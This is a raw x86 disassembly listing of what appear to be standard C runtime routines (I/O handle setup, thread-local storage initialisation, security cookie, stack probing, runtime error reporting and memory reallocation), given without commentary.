  4335b5:	mov    DWORD PTR [esp+0x34],eax
  4335b9:	call   edi
  4335bb:	mov    ebp,eax
  4335bd:	cmp    ebp,ebx
  4335bf:	je     0x4335f3
  4335c1:	push   ebp
  4335c2:	call   0x4311fe
  4335c7:	cmp    eax,ebx
  4335c9:	pop    ecx
  4335ca:	mov    DWORD PTR [esp+0x10],eax
  4335ce:	je     0x4335f3
  4335d0:	push   ebx
  4335d1:	push   ebx
  4335d2:	push   ebp
  4335d3:	push   eax
  4335d4:	push   DWORD PTR [esp+0x24]
  4335d8:	push   esi
  4335d9:	push   ebx
  4335da:	push   ebx
  4335db:	call   edi
  4335dd:	test   eax,eax
  4335df:	jne    0x4335ef
  4335e1:	push   DWORD PTR [esp+0x10]
  4335e5:	call   0x42e0ed
  4335ea:	pop    ecx
  4335eb:	mov    DWORD PTR [esp+0x10],ebx
  4335ef:	mov    ebx,DWORD PTR [esp+0x10]
  4335f3:	push   esi
  4335f4:	call   DWORD PTR ds:0x4390e8
  4335fa:	mov    eax,ebx
  4335fc:	jmp    0x43364e
  4335fe:	cmp    eax,ebp
  433600:	je     0x43360a
  433602:	cmp    eax,ebx
  433604:	je     0x43360a
  433606:	xor    eax,eax
  433608:	jmp    0x43364e
  43360a:	call   DWORD PTR ds:0x4390e4
  433610:	mov    esi,eax
  433612:	cmp    esi,ebx
  433614:	je     0x433606
  433616:	cmp    BYTE PTR [esi],bl
  433618:	je     0x433624
  43361a:	inc    eax
  43361b:	cmp    BYTE PTR [eax],bl
  43361d:	jne    0x43361a
  43361f:	inc    eax
  433620:	cmp    BYTE PTR [eax],bl
  433622:	jne    0x43361a
  433624:	sub    eax,esi
  433626:	inc    eax
  433627:	mov    ebp,eax
  433629:	push   ebp
  43362a:	call   0x4311fe
  43362f:	mov    edi,eax
  433631:	cmp    edi,ebx
  433633:	pop    ecx
  433634:	jne    0x43363a
  433636:	xor    edi,edi
  433638:	jmp    0x433645
  43363a:	push   ebp
  43363b:	push   esi
  43363c:	push   edi
  43363d:	call   0x42da10
  433642:	add    esp,0xc
  433645:	push   esi
  433646:	call   DWORD PTR ds:0x4390e0
  43364c:	mov    eax,edi
  43364e:	pop    edi
  43364f:	pop    esi
  433650:	pop    ebp
  433651:	pop    ebx
  433652:	pop    ecx
  433653:	pop    ecx
  433654:	ret    
  433655:	sub    esp,0x48
  433658:	push   ebx
  433659:	mov    ebx,0x480
  43365e:	push   ebx
  43365f:	call   0x4311fe
  433664:	test   eax,eax
  433666:	pop    ecx
  433667:	jne    0x433671
  433669:	or     eax,0xffffffff
  43366c:	jmp    0x43384e
  433671:	mov    ds:0x465100,eax
  433676:	mov    DWORD PTR ds:0x4650ec,0x20
  433680:	lea    ecx,[eax+0x480]
  433686:	jmp    0x4336a6
  433688:	or     DWORD PTR [eax],0xffffffff
  43368b:	and    DWORD PTR [eax+0x8],0x0
  43368f:	mov    BYTE PTR [eax+0x4],0x0
  433693:	mov    BYTE PTR [eax+0x5],0xa
  433697:	mov    ecx,DWORD PTR ds:0x465100
  43369d:	add    eax,0x24
  4336a0:	add    ecx,0x480
  4336a6:	cmp    eax,ecx
  4336a8:	jb     0x433688
  4336aa:	push   ebp
  4336ab:	push   esi
  4336ac:	push   edi
  4336ad:	lea    eax,[esp+0x14]
  4336b1:	push   eax
  4336b2:	call   DWORD PTR ds:0x439040
  4336b8:	cmp    WORD PTR [esp+0x46],0x0
  4336be:	je     0x4337ad
  4336c4:	mov    eax,DWORD PTR [esp+0x48]
  4336c8:	test   eax,eax
  4336ca:	je     0x4337ad
  4336d0:	mov    edi,DWORD PTR [eax]
  4336d2:	lea    ebp,[eax+0x4]
  4336d5:	lea    eax,[edi+ebp*1]
  4336d8:	mov    DWORD PTR [esp+0x10],eax
  4336dc:	mov    eax,0x800
  4336e1:	cmp    edi,eax
  4336e3:	jl     0x4336e7
  4336e5:	mov    edi,eax
  4336e7:	cmp    DWORD PTR ds:0x4650ec,edi
  4336ed:	jge    0x43373d
  4336ef:	mov    esi,0x465104
  4336f4:	push   ebx
  4336f5:	call   0x4311fe
  4336fa:	test   eax,eax
  4336fc:	pop    ecx
  4336fd:	je     0x433737
  4336ff:	add    DWORD PTR ds:0x4650ec,0x20
  433706:	mov    DWORD PTR [esi],eax
  433708:	lea    ecx,[eax+0x480]
  43370e:	jmp    0x433726
  433710:	or     DWORD PTR [eax],0xffffffff
  433713:	and    DWORD PTR [eax+0x8],0x0
  433717:	mov    BYTE PTR [eax+0x4],0x0
  43371b:	mov    BYTE PTR [eax+0x5],0xa
  43371f:	mov    ecx,DWORD PTR [esi]
  433721:	add    eax,0x24
  433724:	add    ecx,ebx
  433726:	cmp    eax,ecx
  433728:	jb     0x433710
  43372a:	add    esi,0x4
  43372d:	cmp    DWORD PTR ds:0x4650ec,edi
  433733:	jl     0x4336f4
  433735:	jmp    0x43373d
  433737:	mov    edi,DWORD PTR ds:0x4650ec
  43373d:	xor    ebx,ebx
  43373f:	test   edi,edi
  433741:	jle    0x4337ad
  433743:	mov    eax,DWORD PTR [esp+0x10]
  433747:	mov    eax,DWORD PTR [eax]
  433749:	cmp    eax,0xffffffff
  43374c:	je     0x4337a2
  43374e:	mov    cl,BYTE PTR [ebp+0x0]
  433751:	test   cl,0x1
  433754:	je     0x4337a2
  433756:	test   cl,0x8
  433759:	jne    0x433766
  43375b:	push   eax
  43375c:	call   DWORD PTR ds:0x4390f4
  433762:	test   eax,eax
  433764:	je     0x4337a2
  433766:	mov    ecx,ebx
  433768:	mov    eax,ebx
  43376a:	and    eax,0x1f
  43376d:	lea    eax,[eax+eax*8]
  433770:	sar    ecx,0x5
  433773:	mov    ecx,DWORD PTR [ecx*4+0x465100]
  43377a:	lea    esi,[ecx+eax*4]
  43377d:	mov    eax,DWORD PTR [esp+0x10]
  433781:	mov    eax,DWORD PTR [eax]
  433783:	mov    DWORD PTR [esi],eax
  433785:	mov    al,BYTE PTR [ebp+0x0]
  433788:	mov    BYTE PTR [esi+0x4],al
  43378b:	lea    eax,[esi+0xc]
  43378e:	push   0xfa0
  433793:	push   eax
  433794:	call   0x4360f7
  433799:	test   eax,eax
  43379b:	pop    ecx
  43379c:	pop    ecx
  43379d:	je     0x4337cd
  43379f:	inc    DWORD PTR [esi+0x8]
  4337a2:	add    DWORD PTR [esp+0x10],0x4
  4337a7:	inc    ebx
  4337a8:	inc    ebp
  4337a9:	cmp    ebx,edi
  4337ab:	jl     0x433743
  4337ad:	xor    ebx,ebx
  4337af:	mov    ecx,DWORD PTR ds:0x465100
  4337b5:	lea    eax,[ebx+ebx*8]
  4337b8:	lea    esi,[ecx+eax*4]
  4337bb:	cmp    DWORD PTR [esi],0xffffffff
  4337be:	jne    0x43382f
  4337c0:	test   ebx,ebx
  4337c2:	mov    BYTE PTR [esi+0x4],0x81
  4337c6:	jne    0x4337d2
  4337c8:	push   0xfffffff6
  4337ca:	pop    eax
  4337cb:	jmp    0x4337dc
  4337cd:	or     eax,0xffffffff
  4337d0:	jmp    0x43384b
  4337d2:	mov    eax,ebx
  4337d4:	dec    eax
  4337d5:	neg    eax
  4337d7:	sbb    eax,eax
  4337d9:	add    eax,0xfffffff5
  4337dc:	push   eax
  4337dd:	call   DWORD PTR ds:0x4390d4
  4337e3:	mov    edi,eax
  4337e5:	cmp    edi,0xffffffff
  4337e8:	je     0x433829
  4337ea:	push   edi
  4337eb:	call   DWORD PTR ds:0x4390f4
  4337f1:	test   eax,eax
  4337f3:	je     0x433829
  4337f5:	and    eax,0xff
  4337fa:	cmp    eax,0x2
  4337fd:	mov    DWORD PTR [esi],edi
  4337ff:	jne    0x433807
  433801:	or     BYTE PTR [esi+0x4],0x40
  433805:	jmp    0x433810
  433807:	cmp    eax,0x3
  43380a:	jne    0x433810
  43380c:	or     BYTE PTR [esi+0x4],0x8
  433810:	lea    eax,[esi+0xc]
  433813:	push   0xfa0
  433818:	push   eax
  433819:	call   0x4360f7
  43381e:	test   eax,eax
  433820:	pop    ecx
  433821:	pop    ecx
  433822:	je     0x4337cd
  433824:	inc    DWORD PTR [esi+0x8]
  433827:	jmp    0x433833
  433829:	or     BYTE PTR [esi+0x4],0x40
  43382d:	jmp    0x433833
  43382f:	or     BYTE PTR [esi+0x4],0x80
  433833:	inc    ebx
  433834:	cmp    ebx,0x3
  433837:	jl     0x4337af
  43383d:	push   DWORD PTR ds:0x4650ec
  433843:	call   DWORD PTR ds:0x4390f0
  433849:	xor    eax,eax
  43384b:	pop    edi
  43384c:	pop    esi
  43384d:	pop    ebp
  43384e:	pop    ebx
  43384f:	add    esp,0x48
  433852:	ret    
  433853:	push   0xc
  433855:	push   0x43a148
  43385a:	call   0x431210
  43385f:	mov    DWORD PTR [ebp-0x1c],0x43bc00
  433866:	cmp    DWORD PTR [ebp-0x1c],0x43bc00
  43386d:	jae    0x433891
  43386f:	and    DWORD PTR [ebp-0x4],0x0
  433873:	mov    eax,DWORD PTR [ebp-0x1c]
  433876:	mov    eax,DWORD PTR [eax]
  433878:	test   eax,eax
  43387a:	je     0x433887
  43387c:	call   eax
  43387e:	jmp    0x433887
  433880:	xor    eax,eax
  433882:	inc    eax
  433883:	ret    
  433884:	mov    esp,DWORD PTR [ebp-0x18]
  433887:	or     DWORD PTR [ebp-0x4],0xffffffff
  43388b:	add    DWORD PTR [ebp-0x1c],0x4
  43388f:	jmp    0x433866
  433891:	call   0x43124b
  433896:	ret    
  433897:	push   0xc
  433899:	push   0x43a158
  43389e:	call   0x431210
  4338a3:	mov    DWORD PTR [ebp-0x1c],0x43bc08
  4338aa:	cmp    DWORD PTR [ebp-0x1c],0x43bc08
  4338b1:	jae    0x4338d5
  4338b3:	and    DWORD PTR [ebp-0x4],0x0
  4338b7:	mov    eax,DWORD PTR [ebp-0x1c]
  4338ba:	mov    eax,DWORD PTR [eax]
  4338bc:	test   eax,eax
  4338be:	je     0x4338cb
  4338c0:	call   eax
  4338c2:	jmp    0x4338cb
  4338c4:	xor    eax,eax
  4338c6:	inc    eax
  4338c7:	ret    
  4338c8:	mov    esp,DWORD PTR [ebp-0x18]
  4338cb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4338cf:	add    DWORD PTR [ebp-0x1c],0x4
  4338d3:	jmp    0x4338aa
  4338d5:	call   0x43124b
  4338da:	ret    
  4338db:	call   DWORD PTR ds:0x4390f8
  4338e1:	ret    0x4
  4338e4:	mov    eax,ds:0x43dc64
  4338e9:	cmp    eax,0xffffffff
  4338ec:	je     0x4338fc
  4338ee:	push   eax
  4338ef:	call   DWORD PTR ds:0x43fe10
  4338f5:	or     DWORD PTR ds:0x43dc64,0xffffffff
  4338fc:	jmp    0x43101c
  433901:	push   ebx
  433902:	push   esi
  433903:	call   DWORD PTR ds:0x4390ac
  433909:	push   DWORD PTR ds:0x43dc64
  43390f:	mov    ebx,eax
  433911:	call   DWORD PTR ds:0x43fe08
  433917:	mov    esi,eax
  433919:	test   esi,esi
  43391b:	jne    0x433966
  43391d:	push   0x8c
  433922:	push   0x1
  433924:	call   0x4340db
  433929:	mov    esi,eax
  43392b:	test   esi,esi
  43392d:	pop    ecx
  43392e:	pop    ecx
  43392f:	je     0x43395e
  433931:	push   esi
  433932:	push   DWORD PTR ds:0x43dc64
  433938:	call   DWORD PTR ds:0x43fe0c
  43393e:	test   eax,eax
  433940:	je     0x43395e
  433942:	mov    DWORD PTR [esi+0x54],0x43dbb8
  433949:	mov    DWORD PTR [esi+0x14],0x1
  433950:	call   DWORD PTR ds:0x439100
  433956:	or     DWORD PTR [esi+0x4],0xffffffff
  43395a:	mov    DWORD PTR [esi],eax
  43395c:	jmp    0x433966
  43395e:	push   0x10
  433960:	call   0x42ea7f
  433965:	pop    ecx
  433966:	push   ebx
  433967:	call   DWORD PTR ds:0x4390fc
  43396d:	mov    eax,esi
  43396f:	pop    esi
  433970:	pop    ebx
  433971:	ret    
  433972:	push   0x10
  433974:	push   0x43a168
  433979:	call   0x431210
  43397e:	mov    esi,DWORD PTR [ebp+0x8]
  433981:	xor    edi,edi
  433983:	cmp    esi,edi
  433985:	je     0x433a97
  43398b:	mov    eax,DWORD PTR [esi+0x24]
  43398e:	cmp    eax,edi
  433990:	je     0x433999
  433992:	push   eax
  433993:	call   0x42e0ed
  433998:	pop    ecx
  433999:	mov    eax,DWORD PTR [esi+0x2c]
  43399c:	cmp    eax,edi
  43399e:	je     0x4339a7
  4339a0:	push   eax
  4339a1:	call   0x42e0ed
  4339a6:	pop    ecx
  4339a7:	mov    eax,DWORD PTR [esi+0x34]
  4339aa:	cmp    eax,edi
  4339ac:	je     0x4339b5
  4339ae:	push   eax
  4339af:	call   0x42e0ed
  4339b4:	pop    ecx
  4339b5:	mov    eax,DWORD PTR [esi+0x3c]
  4339b8:	cmp    eax,edi
  4339ba:	je     0x4339c3
  4339bc:	push   eax
  4339bd:	call   0x42e0ed
  4339c2:	pop    ecx
  4339c3:	mov    eax,DWORD PTR [esi+0x44]
  4339c6:	cmp    eax,edi
  4339c8:	je     0x4339d1
  4339ca:	push   eax
  4339cb:	call   0x42e0ed
  4339d0:	pop    ecx
  4339d1:	mov    eax,DWORD PTR [esi+0x48]
  4339d4:	cmp    eax,edi
  4339d6:	je     0x4339df
  4339d8:	push   eax
  4339d9:	call   0x42e0ed
  4339de:	pop    ecx
  4339df:	mov    eax,DWORD PTR [esi+0x54]
  4339e2:	cmp    eax,0x43dbb8
  4339e7:	je     0x4339f0
  4339e9:	push   eax
  4339ea:	call   0x42e0ed
  4339ef:	pop    ecx
  4339f0:	push   0xd
  4339f2:	call   0x431126
  4339f7:	pop    ecx
  4339f8:	mov    DWORD PTR [ebp-0x4],edi
  4339fb:	mov    eax,DWORD PTR [esi+0x60]
  4339fe:	mov    DWORD PTR [ebp-0x1c],eax
  433a01:	cmp    eax,edi
  433a03:	je     0x433a18
  433a05:	dec    DWORD PTR [eax]
  433a07:	jne    0x433a18
  433a09:	cmp    eax,DWORD PTR ds:0x464eb4
  433a0f:	je     0x433a18
  433a11:	push   eax
  433a12:	call   0x42e0ed
  433a17:	pop    ecx
  433a18:	or     DWORD PTR [ebp-0x4],0xffffffff
  433a1c:	call   0x433aa4
  433a21:	push   0xc
  433a23:	call   0x431126
  433a28:	pop    ecx
  433a29:	mov    DWORD PTR [ebp-0x4],0x1
  433a30:	mov    eax,DWORD PTR [esi+0x64]
  433a33:	mov    DWORD PTR [ebp-0x20],eax
  433a36:	cmp    eax,edi
  433a38:	je     0x433a87
  433a3a:	dec    DWORD PTR [eax]
  433a3c:	cmp    DWORD PTR [eax+0x2c],edi
  433a3f:	je     0x433a46
  433a41:	mov    ecx,DWORD PTR [eax+0x2c]
  433a44:	dec    DWORD PTR [ecx]
  433a46:	cmp    DWORD PTR [eax+0x34],edi
  433a49:	je     0x433a50
  433a4b:	mov    ecx,DWORD PTR [eax+0x34]
  433a4e:	dec    DWORD PTR [ecx]
  433a50:	cmp    DWORD PTR [eax+0x30],edi
  433a53:	je     0x433a5a
  433a55:	mov    ecx,DWORD PTR [eax+0x30]
  433a58:	dec    DWORD PTR [ecx]
  433a5a:	cmp    DWORD PTR [eax+0x40],edi
  433a5d:	je     0x433a64
  433a5f:	mov    ecx,DWORD PTR [eax+0x40]
  433a62:	dec    DWORD PTR [ecx]
  433a64:	mov    ecx,DWORD PTR [eax+0x4c]
  433a67:	dec    DWORD PTR [ecx+0xb4]
  433a6d:	cmp    eax,DWORD PTR ds:0x43d6ec
  433a73:	je     0x433a87
  433a75:	cmp    eax,0x43d698
  433a7a:	je     0x433a87
  433a7c:	cmp    DWORD PTR [eax],edi
  433a7e:	jne    0x433a87
  433a80:	push   eax
  433a81:	call   0x42f524
  433a86:	pop    ecx
  433a87:	or     DWORD PTR [ebp-0x4],0xffffffff
  433a8b:	call   0x433ab0
  433a90:	push   esi
  433a91:	call   0x42e0ed
  433a96:	pop    ecx
  433a97:	call   0x43124b
  433a9c:	ret    0x4
  433a9f:	xor    edi,edi
  433aa1:	mov    esi,DWORD PTR [ebp+0x8]
  433aa4:	push   0xd
  433aa6:	call   0x431071
  433aab:	pop    ecx
  433aac:	ret    
  433aad:	mov    esi,DWORD PTR [ebp+0x8]
  433ab0:	push   0xc
  433ab2:	call   0x431071
  433ab7:	pop    ecx
  433ab8:	ret    
  433ab9:	call   0x430fd3
  433abe:	test   eax,eax
  433ac0:	jne    0x433aca
  433ac2:	call   0x4338e4
  433ac7:	xor    eax,eax
  433ac9:	ret    
  433aca:	push   esi
  433acb:	push   edi
  433acc:	push   0x43a1ac
  433ad1:	call   DWORD PTR ds:0x43905c
  433ad7:	mov    edi,eax
  433ad9:	test   edi,edi
  433adb:	je     0x433b48
  433add:	mov    esi,DWORD PTR ds:0x4390c8
  433ae3:	push   0x43a1a0
  433ae8:	push   edi
  433ae9:	call   esi
  433aeb:	push   0x43a194
  433af0:	push   edi
  433af1:	mov    ds:0x43fe04,eax
  433af6:	call   esi
  433af8:	push   0x43a188
  433afd:	push   edi
  433afe:	mov    ds:0x43fe08,eax
  433b03:	call   esi
  433b05:	push   0x43a180
  433b0a:	push   edi
  433b0b:	mov    ds:0x43fe0c,eax
  433b10:	call   esi
  433b12:	cmp    DWORD PTR ds:0x43fe08,0x0
  433b19:	mov    ds:0x43fe10,eax
  433b1e:	jne    0x433b48
  433b20:	mov    eax,ds:0x43910c
  433b25:	mov    ds:0x43fe08,eax
  433b2a:	mov    eax,ds:0x439108
  433b2f:	mov    ds:0x43fe0c,eax
  433b34:	mov    eax,ds:0x439104
  433b39:	mov    DWORD PTR ds:0x43fe04,0x4338db
  433b43:	mov    ds:0x43fe10,eax
  433b48:	push   0x433972
  433b4d:	call   DWORD PTR ds:0x43fe04
  433b53:	cmp    eax,0xffffffff
  433b56:	mov    ds:0x43dc64,eax
  433b5b:	je     0x433b9e
  433b5d:	xor    edi,edi
  433b5f:	push   0x8c
  433b64:	inc    edi
  433b65:	push   edi
  433b66:	call   0x4340db
  433b6b:	mov    esi,eax
  433b6d:	test   esi,esi
  433b6f:	pop    ecx
  433b70:	pop    ecx
  433b71:	je     0x433b9e
  433b73:	push   esi
  433b74:	push   DWORD PTR ds:0x43dc64
  433b7a:	call   DWORD PTR ds:0x43fe0c
  433b80:	test   eax,eax
  433b82:	je     0x433b9e
  433b84:	mov    DWORD PTR [esi+0x54],0x43dbb8
  433b8b:	mov    DWORD PTR [esi+0x14],edi
  433b8e:	call   DWORD PTR ds:0x439100
  433b94:	or     DWORD PTR [esi+0x4],0xffffffff
  433b98:	mov    DWORD PTR [esi],eax
  433b9a:	mov    eax,edi
  433b9c:	jmp    0x433ba5
  433b9e:	call   0x4338e4
  433ba3:	xor    eax,eax
  433ba5:	pop    edi
  433ba6:	pop    esi
  433ba7:	ret    
  433ba8:	int3   
  433ba9:	int3   
  433baa:	int3   
  433bab:	int3   
  433bac:	int3   
  433bad:	int3   
  433bae:	int3   
  433baf:	int3   
  433bb0:	cmp    eax,0x1000
  433bb5:	jae    0x433bc5
  433bb7:	neg    eax
  433bb9:	add    eax,esp
  433bbb:	add    eax,0x4
  433bbe:	test   DWORD PTR [eax],eax
  433bc0:	xchg   esp,eax
  433bc1:	mov    eax,DWORD PTR [eax]
  433bc3:	push   eax
  433bc4:	ret    
  433bc5:	push   ecx
  433bc6:	lea    ecx,[esp+0x8]
  433bca:	sub    ecx,0x1000
  433bd0:	sub    eax,0x1000
  433bd5:	test   DWORD PTR [ecx],eax
  433bd7:	cmp    eax,0x1000
  433bdc:	jae    0x433bca
  433bde:	sub    ecx,eax
  433be0:	mov    eax,esp
  433be2:	test   DWORD PTR [ecx],eax
  433be4:	mov    esp,ecx
  433be6:	mov    ecx,DWORD PTR [eax]
  433be8:	mov    eax,DWORD PTR [eax+0x4]
  433beb:	push   eax
  433bec:	ret    
  433bed:	push   0x8
  433bef:	push   0x43a1c0
  433bf4:	call   0x431210
  433bf9:	call   0x433901
  433bfe:	cmp    DWORD PTR [eax+0x6c],0x0
  433c02:	je     0x433c1d
  433c04:	and    DWORD PTR [ebp-0x4],0x0
  433c08:	call   0x433901
  433c0d:	call   DWORD PTR [eax+0x6c]
  433c10:	jmp    0x433c19
  433c12:	xor    eax,eax
  433c14:	inc    eax
  433c15:	ret    
  433c16:	mov    esp,DWORD PTR [ebp-0x18]
  433c19:	or     DWORD PTR [ebp-0x4],0xffffffff
  433c1d:	jmp    0x431380
  433c22:	push   0x8
  433c24:	push   0x43a1d0
  433c29:	call   0x431210
  433c2e:	mov    eax,ds:0x43dc70
  433c33:	test   eax,eax
  433c35:	je     0x433c4a
  433c37:	and    DWORD PTR [ebp-0x4],0x0
  433c3b:	call   eax
  433c3d:	jmp    0x433c46
  433c3f:	xor    eax,eax
  433c41:	inc    eax
  433c42:	ret    
  433c43:	mov    esp,DWORD PTR [ebp-0x18]
  433c46:	or     DWORD PTR [ebp-0x4],0xffffffff
  433c4a:	jmp    0x433bed
  433c4f:	int3   
  433c50:	push   ebp
  433c51:	mov    ebp,esp
  433c53:	sub    esp,0x4
  433c56:	push   ebx
  433c57:	push   ecx
  433c58:	mov    eax,DWORD PTR [ebp+0xc]
  433c5b:	add    eax,0xc
  433c5e:	mov    DWORD PTR [ebp-0x4],eax
  433c61:	mov    eax,DWORD PTR [ebp+0x8]
  433c64:	push   ebp
  433c65:	push   DWORD PTR [ebp+0x10]
  433c68:	mov    ecx,DWORD PTR [ebp+0x10]
  433c6b:	mov    ebp,DWORD PTR [ebp-0x4]
  433c6e:	call   0x42f145
  433c73:	push   esi
  433c74:	push   edi
  433c75:	call   eax
  433c77:	pop    edi
  433c78:	pop    esi
  433c79:	mov    ebx,ebp
  433c7b:	pop    ebp
  433c7c:	mov    ecx,DWORD PTR [ebp+0x10]
  433c7f:	push   ebp
  433c80:	mov    ebp,ebx
  433c82:	cmp    ecx,0x100
  433c88:	jne    0x433c8f
  433c8a:	mov    ecx,0x2
  433c8f:	push   ecx
  433c90:	call   0x42f145
  433c95:	pop    ebp
  433c96:	pop    ecx
  433c97:	pop    ebx
  433c98:	leave  
  433c99:	ret    0xc
  433c9c:	push   esi
  433c9d:	mov    esi,DWORD PTR [esp+0x8]
  433ca1:	mov    eax,DWORD PTR [esi]
  433ca3:	cmp    DWORD PTR [eax],0xe06d7363
  433ca9:	jne    0x433cc7
  433cab:	cmp    DWORD PTR [eax+0x10],0x3
  433caf:	jne    0x433cc7
  433cb1:	mov    eax,DWORD PTR [eax+0x14]
  433cb4:	cmp    eax,0x19930520
  433cb9:	je     0x433cc2
  433cbb:	cmp    eax,0x19930521
  433cc0:	jne    0x433cc7
  433cc2:	call   0x433bed
  433cc7:	mov    eax,ds:0x43fe14
  433ccc:	test   eax,eax
  433cce:	je     0x433ce4
  433cd0:	push   eax
  433cd1:	call   0x4359b8
  433cd6:	test   eax,eax
  433cd8:	pop    ecx
  433cd9:	je     0x433ce4
  433cdb:	push   esi
  433cdc:	call   DWORD PTR ds:0x43fe14
  433ce2:	jmp    0x433ce6
  433ce4:	xor    eax,eax
  433ce6:	pop    esi
  433ce7:	ret    0x4
  433cea:	push   0x433c9c
  433cef:	call   DWORD PTR ds:0x439110
  433cf5:	mov    ds:0x43fe14,eax
  433cfa:	xor    eax,eax
  433cfc:	ret    
  433cfd:	push   DWORD PTR ds:0x43fe14
  433d03:	call   DWORD PTR ds:0x439110
  433d09:	ret    
  433d0a:	push   ebp
  433d0b:	mov    ebp,esp
  433d0d:	sub    esp,0x10
  433d10:	mov    eax,ds:0x43d404
  433d15:	test   eax,eax
  433d17:	je     0x433d20
  433d19:	cmp    eax,0xbb40e64e
  433d1e:	jne    0x433d6e
  433d20:	push   esi
  433d21:	lea    eax,[ebp-0x8]
  433d24:	push   eax
  433d25:	call   DWORD PTR ds:0x439118
  433d2b:	mov    esi,DWORD PTR [ebp-0x4]
  433d2e:	xor    esi,DWORD PTR [ebp-0x8]
  433d31:	call   DWORD PTR ds:0x439114
  433d37:	xor    esi,eax
  433d39:	call   DWORD PTR ds:0x439100
  433d3f:	xor    esi,eax
  433d41:	call   DWORD PTR ds:0x43901c
  433d47:	xor    esi,eax
  433d49:	lea    eax,[ebp-0x10]
  433d4c:	push   eax
  433d4d:	call   DWORD PTR ds:0x439010
  433d53:	mov    eax,DWORD PTR [ebp-0xc]
  433d56:	xor    eax,DWORD PTR [ebp-0x10]
  433d59:	xor    esi,eax
  433d5b:	mov    DWORD PTR ds:0x43d404,esi
  433d61:	jne    0x433d6d
  433d63:	mov    DWORD PTR ds:0x43d404,0xbb40e64e
  433d6d:	pop    esi
  433d6e:	leave  
  433d6f:	ret    
  433d70:	push   0x118
  433d75:	push   0x43a380
  433d7a:	call   0x431210
  433d7f:	mov    eax,ds:0x43d404
  433d84:	mov    DWORD PTR [ebp-0x1c],eax
  433d87:	mov    eax,ds:0x43fe18
  433d8c:	xor    ecx,ecx
  433d8e:	cmp    eax,ecx
  433d90:	je     0x433db1
  433d92:	mov    DWORD PTR [ebp-0x4],ecx
  433d95:	push   DWORD PTR [ebp+0xc]
  433d98:	push   DWORD PTR [ebp+0x8]
  433d9b:	call   eax
  433d9d:	pop    ecx
  433d9e:	pop    ecx
  433d9f:	or     DWORD PTR [ebp-0x4],0xffffffff
  433da3:	jmp    0x433eb0
  433da8:	xor    eax,eax
  433daa:	inc    eax
  433dab:	ret    
  433dac:	mov    esp,DWORD PTR [ebp-0x18]
  433daf:	jmp    0x433d9f
  433db1:	mov    eax,DWORD PTR [ebp+0x8]
  433db4:	dec    eax
  433db5:	je     0x433dcd
  433db7:	mov    edi,0x43a35c
  433dbc:	mov    DWORD PTR [ebp-0x128],0x43a2a8
  433dc6:	mov    esi,0xd4
  433dcb:	jmp    0x433de1
  433dcd:	mov    edi,0x43a288
  433dd2:	mov    DWORD PTR [ebp-0x128],0x43a1e8
  433ddc:	mov    esi,0xb9
  433de1:	mov    BYTE PTR [ebp-0x20],cl
  433de4:	push   0x104
  433de9:	lea    eax,[ebp-0x124]
  433def:	push   eax
  433df0:	push   ecx
  433df1:	call   DWORD PTR ds:0x4390d8
  433df7:	test   eax,eax
  433df9:	jne    0x433e0e
  433dfb:	push   0x43a12c
  433e00:	lea    eax,[ebp-0x124]
  433e06:	push   eax
  433e07:	call   0x432780
  433e0c:	pop    ecx
  433e0d:	pop    ecx
  433e0e:	lea    ebx,[ebp-0x124]
  433e14:	mov    eax,ebx
  433e16:	push   eax
  433e17:	call   0x42e160
  433e1c:	pop    ecx
  433e1d:	add    eax,0xb
  433e20:	cmp    eax,0x3c
  433e23:	jbe    0x433e4a
  433e25:	mov    eax,ebx
  433e27:	push   eax
  433e28:	call   0x42e160
  433e2d:	mov    ebx,eax
  433e2f:	lea    eax,[ebp-0x124]
  433e35:	sub    eax,0x31
  433e38:	add    ebx,eax
  433e3a:	push   0x3
  433e3c:	push   0x43a128
  433e41:	push   ebx
  433e42:	call   0x434d20
  433e47:	add    esp,0x10
  433e4a:	push   ebx
  433e4b:	call   0x42e160
  433e50:	pop    ecx
  433e51:	lea    eax,[eax+esi*1+0xc]
  433e55:	add    eax,0x3
  433e58:	and    eax,0xfffffffc
  433e5b:	call   0x433bb0
  433e60:	mov    DWORD PTR [ebp-0x18],esp
  433e63:	mov    esi,esp
  433e65:	push   edi
  433e66:	push   esi
  433e67:	call   0x432780
  433e6c:	mov    edi,0x43a108
  433e71:	push   edi
  433e72:	push   esi
  433e73:	call   0x432790
  433e78:	push   0x43a1dc
  433e7d:	push   esi
  433e7e:	call   0x432790
  433e83:	push   ebx
  433e84:	push   esi
  433e85:	call   0x432790
  433e8a:	push   edi
  433e8b:	push   esi
  433e8c:	call   0x432790
  433e91:	push   DWORD PTR [ebp-0x128]
  433e97:	push   esi
  433e98:	call   0x432790
  433e9d:	push   0x12010
  433ea2:	push   0x43a0e0
  433ea7:	push   esi
  433ea8:	call   0x436cbd
  433ead:	add    esp,0x3c
  433eb0:	push   0x3
  433eb2:	call   0x432ebe
  433eb7:	int3   
  433eb8:	push   0x14
  433eba:	push   0x43a390
  433ebf:	call   0x431210
  433ec4:	mov    edi,DWORD PTR [ebp+0x8]
  433ec7:	xor    ebx,ebx
  433ec9:	cmp    edi,ebx
  433ecb:	jne    0x433edb
  433ecd:	push   DWORD PTR [ebp+0xc]
  433ed0:	call   0x4311fe
  433ed5:	pop    ecx
  433ed6:	jmp    0x43405f
  433edb:	mov    esi,DWORD PTR [ebp+0xc]
  433ede:	cmp    esi,ebx
  433ee0:	jne    0x433eee
  433ee2:	push   edi
  433ee3:	call   0x42e0ed
  433ee8:	pop    ecx
  433ee9:	jmp    0x43405d
  433eee:	cmp    DWORD PTR ds:0x465234,0x3
  433ef5:	jne    0x434029
  433efb:	mov    DWORD PTR [ebp-0x1c],ebx
  433efe:	cmp    esi,0xffffffe0
  433f01:	ja     0x433ff8
  433f07:	push   0x4
  433f09:	call   0x431126
  433f0e:	pop    ecx
  433f0f:	mov    DWORD PTR [ebp-0x4],ebx
  433f12:	push   edi
  433f13:	call   0x431564
  433f18:	pop    ecx
  433f19:	mov    DWORD PTR [ebp-0x20],eax
  433f1c:	cmp    eax,ebx
  433f1e:	je     0x433fc8
  433f24:	cmp    esi,DWORD PTR ds:0x465220
  433f2a:	ja     0x433f78
  433f2c:	push   esi
  433f2d:	push   edi
  433f2e:	push   eax
  433f2f:	call   0x431a64
  433f34:	add    esp,0xc
  433f37:	test   eax,eax
  433f39:	je     0x433f40
  433f3b:	mov    DWORD PTR [ebp-0x1c],edi
  433f3e:	jmp    0x433f78
  433f40:	push   esi
  433f41:	call   0x431d43
  433f46:	pop    ecx
  433f47:	mov    DWORD PTR [ebp-0x1c],eax
  433f4a:	cmp    eax,ebx
  433f4c:	je     0x433f78
  433f4e:	mov    eax,DWORD PTR [edi-0x4]
